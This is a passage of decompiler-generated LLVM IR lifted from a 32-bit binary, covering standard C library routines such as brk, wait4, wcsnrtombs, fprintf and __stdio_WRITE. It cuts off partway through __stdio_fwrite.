dec_label_pc_8054f7a:                             ; preds = %entry
  %v1_8054f7f = call i32 @__GI_brk(i32 0)
  %v2_8054f87 = icmp slt i32 %v1_8054f7f, 0
  br i1 %v2_8054f87, label %dec_label_pc_8054fad, label %dec_label_pc_8054f7a.dec_label_pc_8054f8b_crit_edge

dec_label_pc_8054f7a.dec_label_pc_8054f8b_crit_edge: ; preds = %dec_label_pc_8054f7a
  %v0_8054f8d.pre = load i32, i32* @global_var_8065b44.1005, align 4
  br label %dec_label_pc_8054f8b

dec_label_pc_8054f8b:                             ; preds = %dec_label_pc_8054f7a.dec_label_pc_8054f8b_crit_edge, %entry
  %v0_8054f9b = phi i32 [ %v0_8054f8d.pre, %dec_label_pc_8054f7a.dec_label_pc_8054f8b_crit_edge ], [ %v0_8054f6d, %entry ]
  %v1_8054f8b = icmp eq i32 %arg1, 0
  %v1_8054f92 = icmp eq i1 %v1_8054f8b, false
  br i1 %v1_8054f92, label %dec_label_pc_8054f98, label %dec_label_pc_8054f94

dec_label_pc_8054f94:                             ; preds = %dec_label_pc_8054f8b
  br label %dec_label_pc_8054fb0

dec_label_pc_8054f98:                             ; preds = %dec_label_pc_8054f8b
  store i32 %v0_8054f9b, i32* @ebx, align 4
  %v2_8054f9d = add i32 %v0_8054f9b, %arg1
  %v1_8054fa1 = call i32 @__GI_brk(i32 %v2_8054f9d)
  %v2_8054fa9 = icmp slt i32 %v1_8054fa1, 0
  %v1_8054fab = icmp eq i1 %v2_8054fa9, false
  br i1 %v1_8054fab, label %dec_label_pc_8054f98.dec_label_pc_8054fb0_crit_edge, label %dec_label_pc_8054fad

dec_label_pc_8054f98.dec_label_pc_8054fb0_crit_edge: ; preds = %dec_label_pc_8054f98
  %v0_8054fb0.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054fb0

dec_label_pc_8054fad:                             ; preds = %dec_label_pc_8054f98, %dec_label_pc_8054f7a
  br label %dec_label_pc_8054fb0

dec_label_pc_8054fb0:                             ; preds = %dec_label_pc_8054f98.dec_label_pc_8054fb0_crit_edge, %dec_label_pc_8054f94, %dec_label_pc_8054fad
  %v0_8054fb0 = phi i32 [ %v0_8054fb0.pre, %dec_label_pc_8054f98.dec_label_pc_8054fb0_crit_edge ], [ %v0_8054f9b, %dec_label_pc_8054f94 ], [ -1, %dec_label_pc_8054fad ]
  %v2_8054fb2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054fb2, i32* @edx, align 4
  store i32 %v0_8054f69, i32* @ebx, align 4
  ret i32 %v0_8054fb0

; uselistorder directives
  uselistorder i32 %v0_8054f9b, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_8054fb0, { 2, 0, 1 }
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8054fb8 = load i32, i32* @edi, align 4
  %v0_8054fb9 = load i32, i32* @esi, align 4
  store i32 %v0_8054fb9, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_8054fcd = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_8054fd5 = call i32 @wait4(i32 %v0_8054fcd, i32 %v0_8054fb9, i32 %v0_8054fb8, i32 %tmp5)
  store i32 %v0_8054fcd, i32* @ebx, align 4
  store i32 %v4_8054fd5, i32* %esi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v4_8054fd5, -4095
  br i1 %tmp10, label %dec_label_pc_8054fed, label %dec_label_pc_8054fe1

dec_label_pc_8054fe1:                             ; preds = %entry
  %v1_8054fe1 = call i32 @__errno_location(i32 %v0_8054fcd)
  %v0_8054fe6 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054fe6 = sub i32 0, %v0_8054fe6
  %v2_8054fe8 = inttoptr i32 %v1_8054fe1 to i32*
  store i32 %v1_8054fe6, i32* %v2_8054fe8, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054fed

dec_label_pc_8054fed:                             ; preds = %entry, %dec_label_pc_8054fe1
  %v0_8054fed = phi i32 [ %v4_8054fd5, %entry ], [ -1, %dec_label_pc_8054fe1 ]
  %v2_8054fef = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054fef, i32* @edx, align 4
  %v2_8054ff0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8054ff0, i32* @esi, align 4
  store i32 %v0_8054fb8, i32* @edi, align 4
  ret i32 %v0_8054fed

; uselistorder directives
  uselistorder i32 %v4_8054fd5, { 1, 0, 2 }
  uselistorder i32 %v0_8054fcd, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054fed, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_8065b24.1006 to i32)
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_8055007 = icmp eq i32 %tmp5, 0
  %v1_8055009 = icmp eq i1 %v1_8055007, false
  br i1 %v1_8055009, label %dec_label_pc_8055011, label %dec_label_pc_805500b

dec_label_pc_805500b:                             ; preds = %entry
  %v2_805500b = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_8055011

dec_label_pc_8055011:                             ; preds = %entry, %dec_label_pc_805500b
  %v0_805502d = phi i32 [ %tmp5, %entry ], [ %v2_805500b, %dec_label_pc_805500b ]
  %v0_8055015 = phi i32 [ %tmp4, %entry ], [ 0, %dec_label_pc_805500b ]
  %v2_8055011 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v0_8055015, i32* %stack_var_-4, align 4
  store i32 %v2_8055011, i32* %stack_var_-8, align 4
  %v2_8055028 = ptrtoint i32* %stack_var_-8 to i32
  %v5_805502e = inttoptr i32 %v0_805502d to i8*
  %v6_805502e = call i32 @__GI_wcsnrtombs(i8* %v5_805502e, i32 %v2_8055028, i32 1, i32 16, i32 %tmp)
  %v1_8055036 = icmp eq i32 %v6_805502e, 0
  %v1_8055038 = icmp eq i1 %v1_8055036, false
  br i1 %v1_8055038, label %dec_label_pc_805503c, label %dec_label_pc_805503a

dec_label_pc_805503a:                             ; preds = %dec_label_pc_8055011
  %v1_805503a = and i32 %v6_805502e, -256
  %v2_805503a = or i32 %v1_805503a, 1
  br label %dec_label_pc_805503c

dec_label_pc_805503c:                             ; preds = %dec_label_pc_8055011, %dec_label_pc_805503a
  %v0_805503f = phi i32 [ %v6_805502e, %dec_label_pc_8055011 ], [ %v2_805503a, %dec_label_pc_805503a ]
  ret i32 %v0_805503f

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_805503c, { 1, 0 }
  uselistorder label %dec_label_pc_8055011, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_8055055 = inttoptr i32 %tmp to i8*
  %v6_8055055 = call i32 @__GI_wcsnrtombs(i8* %v5_8055055, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_8055055
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8055063 = load i32, i32* @ebx, align 4
  %v4_8055067 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055067, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %arg4, i32* %eax.global-to-local, align 4
  %v1_8055073 = icmp eq i8* %arg1, null
  br i1 %v1_8055073, label %dec_label_pc_80550a7.thread, label %dec_label_pc_8055077

dec_label_pc_8055077:                             ; preds = %entry
  store i32 1, i32* %edi.global-to-local, align 4
  %v12_805507c = icmp eq i32 %v4_8055067, %arg2
  %v1_805507e = icmp eq i1 %v12_805507c, false
  br i1 %v1_805507e, label %dec_label_pc_80550a7, label %dec_label_pc_80550a1

dec_label_pc_80550a7.thread:                      ; preds = %entry
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8055084 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8055084, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80550b1

dec_label_pc_805508d:                             ; preds = %dec_label_pc_80550b8
  %v1_805508d = call i32 @__errno_location(i32 %v0_8055063)
  store i32 %v1_805508d, i32* %eax.global-to-local, align 4
  %v1_8055092 = inttoptr i32 %v1_805508d to i32*
  store i32 84, i32* %v1_8055092, align 4
  br label %dec_label_pc_80550de

dec_label_pc_805509d:                             ; preds = %dec_label_pc_80550bf
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_80550d3.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80550cf

dec_label_pc_80550a1:                             ; preds = %dec_label_pc_8055077
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_80550a3 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80550a3, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80550a7

dec_label_pc_80550a7:                             ; preds = %dec_label_pc_8055077, %dec_label_pc_80550a1
  %v2_80550bf15 = phi i32 [ %v4_8055067, %dec_label_pc_8055077 ], [ %v2_80550a3, %dec_label_pc_80550a1 ]
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %tmp33 = icmp ult i32 %arg4, %arg3
  br i1 %tmp33, label %dec_label_pc_80550af, label %dec_label_pc_80550b1

dec_label_pc_80550af:                             ; preds = %dec_label_pc_80550a7
  store i32 %arg4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80550b1

dec_label_pc_80550b1:                             ; preds = %dec_label_pc_80550a7.thread, %dec_label_pc_80550a7, %dec_label_pc_80550af
  %v2_80550bf1532 = phi i32 [ %v2_80550bf15, %dec_label_pc_80550a7 ], [ %v2_80550bf15, %dec_label_pc_80550af ], [ %v2_8055084, %dec_label_pc_80550a7.thread ]
  %v0_80550b4 = phi i32 [ %arg3, %dec_label_pc_80550a7 ], [ %arg4, %dec_label_pc_80550af ], [ %arg3, %dec_label_pc_80550a7.thread ]
  %v1_80550b1 = inttoptr i32 %arg2 to i32*
  %v2_80550b1 = load i32, i32* %v1_80550b1, align 4
  store i32 %v2_80550b1, i32* %esi.global-to-local, align 4
  store i32 %v0_80550b4, i32* @ecx, align 4
  %v1_80550cb3 = icmp eq i32 %v0_80550b4, 0
  %v1_80550cd10 = icmp eq i1 %v1_80550cb3, false
  br i1 %v1_80550cd10, label %dec_label_pc_80550b8, label %dec_label_pc_80550cf

dec_label_pc_80550b8:                             ; preds = %dec_label_pc_80550b1, %dec_label_pc_80550c5
  %v2_80550bf = phi i32 [ %v2_80550c8, %dec_label_pc_80550c5 ], [ %v2_80550bf1532, %dec_label_pc_80550b1 ]
  %v0_80550b8 = phi i32 [ %v1_80550c5, %dec_label_pc_80550c5 ], [ %v2_80550b1, %dec_label_pc_80550b1 ]
  %v1_80550b8 = inttoptr i32 %v0_80550b8 to i32*
  %v2_80550b8 = load i32, i32* %v1_80550b8, align 4
  store i32 %v2_80550b8, i32* %eax.global-to-local, align 4
  %v6_80550bd = icmp ugt i32 %v2_80550b8, 127
  br i1 %v6_80550bd, label %dec_label_pc_805508d, label %dec_label_pc_80550bf

dec_label_pc_80550bf:                             ; preds = %dec_label_pc_80550b8
  %v1_80550bf = trunc i32 %v2_80550b8 to i8
  %v3_80550bf = inttoptr i32 %v2_80550bf to i8*
  store i8 %v1_80550bf, i8* %v3_80550bf, align 1
  %v0_80550c1 = load i32, i32* %eax.global-to-local, align 4
  %v3_80550c1 = trunc i32 %v0_80550c1 to i8
  %v4_80550c1 = icmp eq i8 %v3_80550c1, 0
  br i1 %v4_80550c1, label %dec_label_pc_805509d, label %dec_label_pc_80550c5

dec_label_pc_80550c5:                             ; preds = %dec_label_pc_80550bf
  %v0_80550c5 = load i32, i32* %esi.global-to-local, align 4
  %v1_80550c5 = add i32 %v0_80550c5, 4
  store i32 %v1_80550c5, i32* %esi.global-to-local, align 4
  %v0_80550c8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80550c8 = load i32, i32* %edi.global-to-local, align 4
  %v2_80550c8 = add i32 %v1_80550c8, %v0_80550c8
  store i32 %v2_80550c8, i32* %edx.global-to-local, align 4
  %v0_80550ca = load i32, i32* @ecx, align 4
  %v1_80550ca = add i32 %v0_80550ca, -1
  %v8_80550ca = icmp eq i32 %v1_80550ca, 0
  store i32 %v1_80550ca, i32* @ecx, align 4
  %v1_80550cd = icmp eq i1 %v8_80550ca, false
  br i1 %v1_80550cd, label %dec_label_pc_80550b8, label %dec_label_pc_80550cf

dec_label_pc_80550cf:                             ; preds = %dec_label_pc_80550c5, %dec_label_pc_80550b1, %dec_label_pc_805509d
  %v0_80550d7 = phi i32 [ 0, %dec_label_pc_805509d ], [ %v2_80550b1, %dec_label_pc_80550b1 ], [ %v1_80550c5, %dec_label_pc_80550c5 ]
  %v0_80550d3 = phi i32 [ %v0_80550d3.pre, %dec_label_pc_805509d ], [ %v2_80550bf1532, %dec_label_pc_80550b1 ], [ %v2_80550c8, %dec_label_pc_80550c5 ]
  %v2_80550cf = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80550cf, i32* %eax.global-to-local, align 4
  %v12_80550d3 = icmp eq i32 %v0_80550d3, %v2_80550cf
  br i1 %v12_80550d3, label %dec_label_pc_80550da, label %dec_label_pc_80550d7

dec_label_pc_80550d7:                             ; preds = %dec_label_pc_80550cf
  %v1_80550d7 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80550d7 = inttoptr i32 %v1_80550d7 to i32*
  store i32 %v0_80550d7, i32* %v2_80550d7, align 4
  br label %dec_label_pc_80550da

dec_label_pc_80550da:                             ; preds = %dec_label_pc_80550cf, %dec_label_pc_80550d7
  %v0_80550da = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80550da, i32* %eax.global-to-local, align 4
  %v1_80550dc = load i32, i32* @ecx, align 4
  %v2_80550dc = sub i32 %v0_80550da, %v1_80550dc
  br label %dec_label_pc_80550de

dec_label_pc_80550de:                             ; preds = %dec_label_pc_805508d, %dec_label_pc_80550da
  %storemerge1 = phi i32 [ %v2_80550dc, %dec_label_pc_80550da ], [ -1, %dec_label_pc_805508d ]
  store i32 %storemerge1, i32* %eax.global-to-local, align 4
  store i32 %v0_8055063, i32* @ebx, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v2_80550c8, { 0, 2, 1 }
  uselistorder i32 %v1_80550c5, { 0, 2, 1 }
  uselistorder i32 %v2_80550b1, { 1, 0, 2 }
  uselistorder i32 %v0_80550b4, { 1, 0 }
  uselistorder i32 %v2_80550bf1532, { 1, 0 }
  uselistorder i32 %v4_8055067, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %edi.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3, 4, 6, 5, 7 }
  uselistorder i32 127, { 3, 1, 7, 4, 5, 8, 2, 0, 6 }
  uselistorder i32 %arg4, { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 1, 3, 4, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80550de, { 1, 0 }
  uselistorder label %dec_label_pc_80550da, { 1, 0 }
  uselistorder label %dec_label_pc_80550b8, { 1, 0 }
  uselistorder label %dec_label_pc_80550b1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80550a7, { 1, 0 }
}

define i32 @fprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_80550eb = ptrtoint i32* %stack_var_12 to i32
  %v0_80550f3 = load i32, i32* @edx, align 4
  %v4_80550fd = inttoptr i32 %arg1 to i16*
  %v5_80550fd = call i32 @__GI_vfprintf(i16* %v4_80550fd, i32 %arg2, i32 %v2_80550eb, i32 %v0_80550f3)
  ret i32 %v5_80550fd
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_8055109 = load i32, i32* @edi, align 4
  %v0_805510b = load i32, i32* @ebx, align 4
  %v4_805510f = ptrtoint i16* %arg1 to i32
  store i32 %v4_805510f, i32* @edi, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_805511b4 = icmp eq i32 %arg3, 0
  br i1 %v1_805511b4, label %dec_label_pc_805517a, label %dec_label_pc_8055120.lr.ph

dec_label_pc_8055120.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8055120

dec_label_pc_8055120:                             ; preds = %dec_label_pc_805513f.dec_label_pc_8055120_crit_edge, %dec_label_pc_8055120.lr.ph
  %v0_8055130 = phi i32 [ %v4_805510f, %dec_label_pc_8055120.lr.ph ], [ %v0_8055130.pre, %dec_label_pc_805513f.dec_label_pc_8055120_crit_edge ]
  %v0_805512f = phi i32 [ %arg2, %dec_label_pc_8055120.lr.ph ], [ %v2_8055141, %dec_label_pc_805513f.dec_label_pc_8055120_crit_edge ]
  %v0_8055122.in = phi i32 [ %arg3, %dec_label_pc_8055120.lr.ph ], [ %v2_805513f, %dec_label_pc_805513f.dec_label_pc_8055120_crit_edge ]
  %v0_8055122 = icmp slt i32 %v0_8055122.in, 0
  store i32 %v0_8055122.in, i32* %ebp.global-to-local, align 4
  %v2_8055122 = icmp eq i1 %v0_8055122, false
  %storemerge = select i1 %v2_8055122, i32 %v0_8055122.in, i32 2147483647
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8055130 = add i32 %v0_8055130, 4
  %v2_8055130 = inttoptr i32 %v1_8055130 to i32*
  %v3_8055130 = load i32, i32* %v2_8055130, align 4
  %tmp36 = inttoptr i32 %v0_805512f to i32*
  %v5_8055133 = call i32 @__libc_write(i32 %v3_8055130, i32* %tmp36, i32 %storemerge)
  store i32 %v5_8055133, i32* %eax.global-to-local, align 4
  %v2_805513b = icmp slt i32 %v5_8055133, 0
  br i1 %v2_805513b, label %dec_label_pc_8055145, label %dec_label_pc_805513f

dec_label_pc_805513f:                             ; preds = %dec_label_pc_8055120
  %v0_805513f = load i32, i32* @ebx, align 4
  %v2_805513f = sub i32 %v0_805513f, %v5_8055133
  %v12_805513f = icmp eq i32 %v2_805513f, 0
  store i32 %v2_805513f, i32* @ebx, align 4
  %v0_8055141 = load i32, i32* %esi.global-to-local, align 4
  %v2_8055141 = add i32 %v0_8055141, %v5_8055133
  store i32 %v2_8055141, i32* %esi.global-to-local, align 4
  br i1 %v12_805513f, label %dec_label_pc_805517a, label %dec_label_pc_805513f.dec_label_pc_8055120_crit_edge

dec_label_pc_805513f.dec_label_pc_8055120_crit_edge: ; preds = %dec_label_pc_805513f
  %v0_8055130.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8055120

dec_label_pc_8055145:                             ; preds = %dec_label_pc_8055120
  %v0_8055145 = load i32, i32* @edi, align 4
  %v1_8055145 = add i32 %v0_8055145, 8
  %v2_8055145 = inttoptr i32 %v1_8055145 to i32*
  %v3_8055145 = load i32, i32* %v2_8055145, align 4
  store i32 %v3_8055145, i32* @edx, align 4
  %v1_8055148 = add i32 %v0_8055145, 12
  %v2_8055148 = inttoptr i32 %v1_8055148 to i32*
  %v3_8055148 = load i32, i32* %v2_8055148, align 4
  store i32 %v3_8055148, i32* %eax.global-to-local, align 4
  %v1_805514b = inttoptr i32 %v0_8055145 to i16*
  %v2_805514b = load i16, i16* %v1_805514b, align 2
  %v3_805514b = or i16 %v2_805514b, 8
  store i16 %v3_805514b, i16* %v1_805514b, align 2
  %v0_805514f = load i32, i32* %eax.global-to-local, align 4
  %v1_805514f = load i32, i32* @edx, align 4
  %v2_805514f = sub i32 %v0_805514f, %v1_805514f
  %v12_805514f = icmp eq i32 %v2_805514f, 0
  store i32 %v2_805514f, i32* %eax.global-to-local, align 4
  %v4_8055176.pre = load i32, i32* @ebx, align 4
  br i1 %v12_805514f, label %dec_label_pc_8055176, label %dec_label_pc_8055153

dec_label_pc_8055153:                             ; preds = %dec_label_pc_8055145
  %v6_8055155 = icmp ugt i32 %v2_805514f, %v4_8055176.pre
  br i1 %v6_8055155, label %dec_label_pc_8055159.preheader, label %dec_label_pc_8055157

dec_label_pc_8055157:                             ; preds = %dec_label_pc_8055153
  store i32 %v2_805514f, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8055159.preheader

dec_label_pc_8055159.preheader:                   ; preds = %dec_label_pc_8055157, %dec_label_pc_8055153
  %v0_8055159.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8055159

dec_label_pc_8055159:                             ; preds = %dec_label_pc_8055159.preheader, %dec_label_pc_805516b
  %v2_805515b = phi i32 [ %v1_805514f, %dec_label_pc_8055159.preheader ], [ %v1_8055167, %dec_label_pc_805516b ]
  %v4_8055159 = phi i32 [ %v2_805514f, %dec_label_pc_8055159.preheader ], [ %v0_805515d, %dec_label_pc_805516b ]
  %v0_8055159 = phi i32 [ %v0_8055159.pre, %dec_label_pc_8055159.preheader ], [ %v1_805516b, %dec_label_pc_805516b ]
  %v1_8055159 = inttoptr i32 %v0_8055159 to i8*
  %v2_8055159 = load i8, i8* %v1_8055159, align 1
  %v3_8055159 = zext i8 %v2_8055159 to i32
  %v5_8055159 = and i32 %v4_8055159, -256
  %v6_8055159 = or i32 %v3_8055159, %v5_8055159
  store i32 %v6_8055159, i32* %eax.global-to-local, align 4
  %v3_805515b = inttoptr i32 %v2_805515b to i8*
  store i8 %v2_8055159, i8* %v3_805515b, align 1
  %v0_805515d = load i32, i32* %eax.global-to-local, align 4
  %v1_805515d = trunc i32 %v0_805515d to i8
  %v10_805515d = icmp eq i8 %v1_805515d, 10
  %v1_805515f = icmp eq i1 %v10_805515d, false
  br i1 %v1_805515f, label %dec_label_pc_8055167, label %dec_label_pc_8055161

dec_label_pc_8055161:                             ; preds = %dec_label_pc_8055159
  %v0_8055161 = load i32, i32* @edi, align 4
  %v1_8055161 = add i32 %v0_8055161, 1
  %v2_8055161 = inttoptr i32 %v1_8055161 to i8*
  %v3_8055161 = load i8, i8* %v2_8055161, align 1
  %v4_8055161 = urem i8 %v3_8055161, 2
  %v5_8055161 = icmp eq i8 %v4_8055161, 0
  %v1_8055165 = icmp eq i1 %v5_8055161, false
  br i1 %v1_8055165, label %dec_label_pc_8055161.dec_label_pc_805516e_crit_edge, label %dec_label_pc_8055167

dec_label_pc_8055161.dec_label_pc_805516e_crit_edge: ; preds = %dec_label_pc_8055161
  %v0_805516e.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805516e

dec_label_pc_8055167:                             ; preds = %dec_label_pc_8055161, %dec_label_pc_8055159
  %v0_8055167 = load i32, i32* @edx, align 4
  %v1_8055167 = add i32 %v0_8055167, 1
  store i32 %v1_8055167, i32* @edx, align 4
  %v0_8055168 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8055168 = add i32 %v0_8055168, -1
  %v8_8055168 = icmp eq i32 %v1_8055168, 0
  store i32 %v1_8055168, i32* %ebp.global-to-local, align 4
  br i1 %v8_8055168, label %dec_label_pc_8055167.dec_label_pc_805516e_crit_edge, label %dec_label_pc_805516b

dec_label_pc_8055167.dec_label_pc_805516e_crit_edge: ; preds = %dec_label_pc_8055167
  %v1_805516e.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805516e

dec_label_pc_805516b:                             ; preds = %dec_label_pc_8055167
  %v0_805516b = load i32, i32* %esi.global-to-local, align 4
  %v1_805516b = add i32 %v0_805516b, 1
  store i32 %v1_805516b, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8055159

dec_label_pc_805516e:                             ; preds = %dec_label_pc_8055167.dec_label_pc_805516e_crit_edge, %dec_label_pc_8055161.dec_label_pc_805516e_crit_edge
  %v1_805516e = phi i32 [ %v0_8055161, %dec_label_pc_8055161.dec_label_pc_805516e_crit_edge ], [ %v1_805516e.pre, %dec_label_pc_8055167.dec_label_pc_805516e_crit_edge ]
  %v0_805516e = phi i32 [ %v0_805516e.pre, %dec_label_pc_8055161.dec_label_pc_805516e_crit_edge ], [ %v1_8055167, %dec_label_pc_8055167.dec_label_pc_805516e_crit_edge ]
  %v2_805516e = add i32 %v1_805516e, 16
  %v3_805516e = inttoptr i32 %v2_805516e to i32*
  store i32 %v0_805516e, i32* %v3_805516e, align 4
  %v0_8055171 = load i32, i32* @edx, align 4
  %v1_8055171 = load i32, i32* @edi, align 4
  %v2_8055171 = add i32 %v1_8055171, 8
  %v3_8055171 = inttoptr i32 %v2_8055171 to i32*
  %v4_8055171 = load i32, i32* %v3_8055171, align 4
  %v5_8055171 = sub i32 %v0_8055171, %v4_8055171
  store i32 %v5_8055171, i32* @edx, align 4
  %v0_8055174 = load i32, i32* @ebx, align 4
  %v2_8055174 = sub i32 %v0_8055174, %v5_8055171
  br label %dec_label_pc_8055176

dec_label_pc_8055176:                             ; preds = %dec_label_pc_8055145, %dec_label_pc_805516e
  %v4_8055176 = phi i32 [ %v2_8055174, %dec_label_pc_805516e ], [ %v4_8055176.pre, %dec_label_pc_8055145 ]
  %v5_8055176 = sub i32 %arg3, %v4_8055176
  br label %dec_label_pc_805517a

dec_label_pc_805517a:                             ; preds = %dec_label_pc_805513f, %entry, %dec_label_pc_8055176
  %stack_var_12.0 = phi i32 [ %v5_8055176, %dec_label_pc_8055176 ], [ 0, %entry ], [ %arg3, %dec_label_pc_805513f ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  store i32 %v0_805510b, i32* @ebx, align 4
  store i32 %v0_8055109, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_805516b, { 1, 0 }
  uselistorder i32 %v1_8055168, { 1, 0 }
  uselistorder i32 %v1_8055167, { 0, 2, 1 }
  uselistorder i32 %v0_805515d, { 1, 0 }
  uselistorder i32 %v2_8055141, { 1, 0 }
  uselistorder i32 %v2_805513f, { 1, 2, 0 }
  uselistorder i32 %v5_8055133, { 0, 2, 1, 3 }
  uselistorder i32* %esi.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %ebp.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32*, i32)* @__libc_write, { 2, 0, 1 }
  uselistorder i32 %arg3, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_805517a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055176, { 1, 0 }
  uselistorder label %dec_label_pc_8055159, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8055188 = load i32, i32* @ebp, align 4
  %v0_8055189 = load i32, i32* @edi, align 4
  %v0_805518a = load i32, i32* @esi, align 4
  %v0_805518b = load i32, i32* @ebx, align 4
  store i32 %v0_805518b, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @ebx, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_805519b = add i32 %arg3, 1
  %v2_805519b = inttoptr i32 %v1_805519b to i8*
  %v3_805519b = load i8, i8* %v2_805519b, align 1
  %v4_805519b = and i8 %v3_805519b, 2
  %v5_805519b = icmp eq i8 %v4_805519b, 0
  %v1_805519f = icmp eq i1 %v5_805519b, false
  br i1 %v1_805519f, label %dec_label_pc_8055256, label %dec_label_pc_80551a5

dec_label_pc_80551a5:                             ; preds = %entry
  %v1_80551a5 = add i32 %arg3, 4
  %v2_80551a5 = inttoptr i32 %v1_80551a5 to i32*
  %v3_80551a5 = load i32, i32* %v2_80551a5, align 4
  %v13_80551a5 = icmp eq i32 %v3_80551a5, -2
  %v1_80551a9 = add i32 %arg3, 16
  %v2_80551a9 = inttoptr i32 %v1_80551a9 to i32*
  %v3_80551a9 = load i32, i32* %v2_80551a9, align 4
